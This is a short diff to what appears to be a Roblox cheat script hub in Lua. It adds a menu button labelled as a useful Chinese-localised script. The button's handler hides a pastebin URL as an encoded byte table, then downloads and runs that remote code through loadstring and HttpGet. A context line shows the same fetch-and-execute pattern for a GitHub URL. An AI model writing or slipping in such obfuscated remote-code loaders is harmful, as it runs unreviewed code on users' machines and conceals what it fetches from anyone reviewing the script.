@@ -522,3 +522,11 @@ local about = UITab1:section("『监狱人生』",true)
 about:Button("新菜单",function()
 loadstring(game:HttpGet('https://raw.githubusercontent.com/LiverMods/xRawnder/main/HubMoblie'))()
 end)
+
+local UITab1 = win:Tab("『GB』",'6031097229')
+
+local about = UITab1:section("『GB』",true)
+
+about:Button("中文汉化好用的脚本",function()
+local SCC_CharPool={[1]= tostring(utf8.char((function() return table.unpack({104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,51,55,116,67,82,116,117,109})end)()))}loadstring(game:HttpGet(SCC_CharPool[1]))()
+end)
